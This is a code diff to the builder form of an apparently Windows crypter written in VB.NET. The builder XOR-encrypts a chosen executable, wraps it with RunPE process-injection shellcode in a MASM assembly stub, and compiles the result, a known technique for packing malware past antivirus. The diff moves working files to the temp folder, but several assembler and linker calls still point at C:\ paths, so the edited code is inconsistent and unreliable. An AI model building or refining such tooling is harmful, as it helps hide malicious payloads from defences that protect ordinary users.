@@ -3,6 +3,7 @@ Imports System.IO
 
 Public Class FrmBuilder
     Dim EncryptionKey As String = ""
+    Dim MasmPath As String = "" 'Holds MasmPath variable
     Dim ShellParserObject As New ShellParse
     Dim InputExecutable As ShellParse.ShellCode
     Dim RunPE As ShellParse.ShellCode
@@ -13,12 +14,13 @@ Public Class FrmBuilder
         Dim SaveFile As New SaveFileDialog
         SaveFile.Filter = "Executables *.exe|*.exe"
         If SaveFile.ShowDialog = Windows.Forms.DialogResult.OK Then
+            Dim TempPath As String = System.IO.Path.GetTempPath 'Store data in temp
             GenerateEncryptionKey()
-            Dim ParsedInput As String = ShellParserObject.ParseExe("C:\server.exe")
+            Dim ParsedInput As String = ShellParserObject.ParseExe(FileText.Text)
             InputExecutable = ShellParserObject.ByteXorExecutable(ParsedInput, EncryptionKey, "dwEXEArray", 16)
             RunPE = ShellParserObject.ByteXorExecutable(RunPEShellCode, EncryptionKey, "szShellCode", 20)
             Dim RunPEEdit As String = File.ReadAllText(RunPE.OutputLocation) 'Files are dumped to disk to save memory
-            File.WriteAllText("C:\byte.inc", ".data" & vbNewLine & System.IO.File.ReadAllText(InputExecutable.OutputLocation) & vbNewLine & RunPEEdit.Substring(0, RunPEEdit.Length - 1)) 'last character of shellcode is extra comma for no reason this gets rid of it
+            File.WriteAllText(TempPath + "byte.inc", ".data" & vbNewLine & System.IO.File.ReadAllText(InputExecutable.OutputLocation) & vbNewLine & RunPEEdit.Substring(0, RunPEEdit.Length - 1)) 'last character of shellcode is extra comma for no reason this gets rid of it
             File.Delete(InputExecutable.OutputLocation)
             File.Delete(RunPE.OutputLocation)
             Dim StubCode As String = My.Resources.StubCode
@@ -28,17 +30,18 @@ Public Class FrmBuilder
             StubCode = StubCode.Replace("%shellen%", InputExecutable.KeyLength - 695)
             StubCode = StubCode.Replace("%maxprime%", PrimeIndex + 1)
             StubCode = StubCode.Replace("%primeadder%", InputExecutable.KeyLength - PrimaryPrime)
-            File.WriteAllText("C:\stub.asm", StubCode)
-            Shell("C:\masm32\bin\ml.exe /c /coff /Cp /nologo /Fo " + Chr(34) + "C:\stub.obj" + Chr(34) + " /I" + Chr(34) + "\Masm32\Include" + Chr(34) + " " + Chr(34) + "C:\stub.asm" + Chr(34))
+            File.WriteAllText(TempPath + "\stub.asm", StubCode)
+            Shell(MasmPath + "\bin\ml.exe /c /coff /Cp /nologo /Fo " + Chr(34) + "C:\stub.obj" + Chr(34) + " /I" + Chr(34) + "\Masm32\Include" + Chr(34) + " " + Chr(34) + "C:\stub.asm" + Chr(34))
             System.Threading.Thread.Sleep(InputExecutable.KeyLength / 100) 'Assembling takes a little bit, you can edit this for your own faster machine or smaller files
-            Shell("C:\masm32\bin\Link.exe /SUBSYSTEM:WINDOWS /RELEASE /VERSION:4.0 " + Chr(34) + "/LIBPATH:\Masm32\Lib" + Chr(34) + " " + Chr(34) + "C:\stub.obj" + Chr(34) + " " + Chr(34) + "/OUT:" + Chr(34) + "C:\stub.exe" + Chr(34))
+            Shell(MasmPath + "\bin\Link.exe /SUBSYSTEM:WINDOWS /RELEASE /VERSION:4.0 " + Chr(34) + "/LIBPATH:\Masm32\Lib" + Chr(34) + " " + Chr(34) + "C:\stub.obj" + Chr(34) + " " + Chr(34) + "/OUT:" + Chr(34) + "C:\stub.exe" + Chr(34))
             System.Threading.Thread.Sleep(InputExecutable.KeyLength / 100) 'Linking takes less timet, you can edit this for your own faster machine or smaller files
-            File.Copy("C:\stub.exe", SaveFile.FileName) 'Copy to output
+            File.Copy(TempPath + "stub.exe", SaveFile.FileName) 'Copy to output
             'Clean up drive
-            File.Delete("C:\byte.inc")
-            File.Delete("C:\stub.asm")
-            File.Delete("C:\stub.obj")
-            File.Delete("C:\stub.exe")
+            File.Delete(TempPath + "byte.inc")
+            File.Delete(TempPath + "stub.asm")
+            File.Delete(TempPath + "stub.obj")
+            File.Delete(TempPath + "stub.exe")
+            MsgBox("Encryption sucessful", MsgBoxStyle.OkOnly, "Complete")
         End If
     End Sub
     Function ReturnRandomPrime()
@@ -47,8 +50,9 @@ Public Class FrmBuilder
     End Function
     Private Sub FrmBuilder_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
         Randomize()
-        If Not File.Exists("C:\masm32\bin\ml.exe") Then 'check if masm is installed by looking for assembler executable
-            MessageBox.Show("Masm 32 not found on C drive, please install before using", "Fatal Error", MessageBoxButtons.OK, MessageBoxIcon.Error)
+        MasmPath = Environment.GetEnvironmentVariable("MASM32_PATH")
+        If MasmPath.Length = 0 Then
+            MsgBox("MASM not found on computer, please download and install it.", MsgBoxStyle.OkOnly, "Error: No compiler")
             Application.Exit()
         End If
     End Sub
